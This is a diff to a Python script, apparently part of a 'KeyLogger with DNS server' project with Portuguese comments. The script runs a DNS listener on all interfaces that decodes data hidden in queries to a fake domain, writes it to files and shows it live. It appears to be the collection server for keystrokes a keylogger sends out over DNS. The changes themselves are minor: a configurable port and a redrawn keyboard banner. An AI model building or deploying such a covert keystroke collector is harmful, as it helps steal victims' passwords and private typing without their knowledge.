@@ -3,13 +3,21 @@
 ###############################################################
 import socket
 from dnslib import DNSRecord, QTYPE, RR, A
-import time
 import os.path
+import sys
 
 ###############################################################
 # Vars. Global
 ###############################################################
-_DNS_ADDR = ('0.0.0.0', 9953)
+# Verifico se foi passado a porta se
+# não pega uma padrão para subir o server
+if len(sys.argv) > 1:
+    _PORT = int(sys.argv[1])
+else:
+    _PORT = 9953
+
+
+_DNS_ADDR = ('0.0.0.0', _PORT)
 _FAKE_DOMAIN = '.example.com.'
 _LAST_REQUEST = []
 _COR = {
@@ -46,7 +54,6 @@ def treatments(data):
 
     for key, value in replacements.items():
         data = data.replace(key, value)
-        #print(data)
 
     return data
 
@@ -65,7 +72,7 @@ def write_on_file(path, arc_name, data):
             file.close()
 
 def menu(addr=None, data=None):
-    global _LAST_REQUEST
+    global _LAST_REQUEST, _PORT
 
     if len(_LAST_REQUEST) <= 10 and data != None:
         _LAST_REQUEST.append(f'{addr} | {data}\n')
@@ -76,18 +83,22 @@ def menu(addr=None, data=None):
     request_string = ''.join(i for i in _LAST_REQUEST)
 
     os.system('cls')
-    print(f'''
-{_COR['red']}╦╔═{_COR['limpa']}┌─┐┬ ┬{_COR['red']}╦  {_COR['limpa']}┌─┐┌─┐┌─┐┌─┐┬─┐          
-{_COR['red']}╠╩╗{_COR['limpa']}├┤ └┬┘{_COR['red']}║  {_COR['limpa']}│ ││ ┬│ ┬├┤ ├┬┘          
-{_COR['red']}╩ ╩{_COR['limpa']}└─┘ ┴ {_COR['red']}╩═╝{_COR['limpa']}└─┘└─┘└─┘└─┘┴└─          
-┬ ┬┬┌┬┐┬ ┬  {_COR['red']}╔╦╗╔╗╔╔═╗{_COR['limpa']}┌─┐┬─┐┬  ┬┌─┐┬─┐
-││││ │ ├─┤   {_COR['red']}║║║║║╚═╗{_COR['limpa']}├┤ ├┬┘└┐┌┘├┤ ├┬┘
-└┴┘┴ ┴ ┴ ┴  {_COR['red']}═╩╝╝╚╝╚═╝{_COR['limpa']}└─┘┴└─ └┘ └─┘┴└─    
-[Aceitando requisições na porta {_COR['green']}9953{_COR['limpa']}]
 
-[Requisições em tempo real]
-{request_string}
-''')
+    # Sei que a visualização por aqui fica ruim, porém no terminal fica lindo!
+    print(f"""
+,---,---,---,---,---,---,---,---,---,---,---,---,---,-------,
+| " | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | - | + | <---  |   {_COR['red']}╦╔═{_COR['limpa']}┌─┐┬ ┬{_COR['red']}╦  {_COR['limpa']}┌─┐┌─┐┌─┐┌─┐┬─┐
+|---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-----|   {_COR['red']}╠╩╗{_COR['limpa']}├┤ └┬┘{_COR['red']}║  {_COR['limpa']}│ ││ ┬│ ┬├┤ ├┬┘ 
+| ->| | Q | {_COR['red']}W{_COR['limpa']} | E | R | T | Y | U | I | O | P | ` | [ |     |   {_COR['red']}╩ ╩{_COR['limpa']}└─┘ ┴ {_COR['red']}╩═╝{_COR['limpa']}└─┘└─┘└─┘└─┘┴└─
+|-----',--',--',--',--',--',--',--',--',--',--',--',--'     |   ┬ ┬┬┌┬┐┬ ┬  {_COR['red']}╔╦╗╔╗╔╔═╗{_COR['limpa']}┌─┐┬─┐┬  ┬┌─┐┬─┐
+| Caps | {_COR['red']}A{_COR['limpa']} | {_COR['red']}S{_COR['limpa']} | {_COR['red']}D{_COR['limpa']} | F | G | H | J | K | L | Ç | ~ |  Enter |   ││││ │ ├─┤   {_COR['red']}║║║║║╚═╗{_COR['limpa']}├┤ ├┬┘└┐┌┘├┤ ├┬┘
+|------'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'--------|   └┴┘┴ ┴ ┴ ┴  {_COR['red']}═╩╝╝╚╝╚═╝{_COR['limpa']}└─┘┴└─ └┘ └─┘┴└─
+| Shift  | Z | X | C | V | B | N | M | < | > | ; |   Shift  |
+|------,-',--'--,'---'---'---'---'---'---'-,-'---',--,------|   [Aceitando requisições na porta {_COR['green']}{_PORT}{_COR['limpa']}]
+| ctrl |  | alt |                          | alt  |  | ctrl |   [Requisições em tempo real]
+'------'--'-----'--------------------------'------'--'------'
+
+{request_string}""")
 
 
 
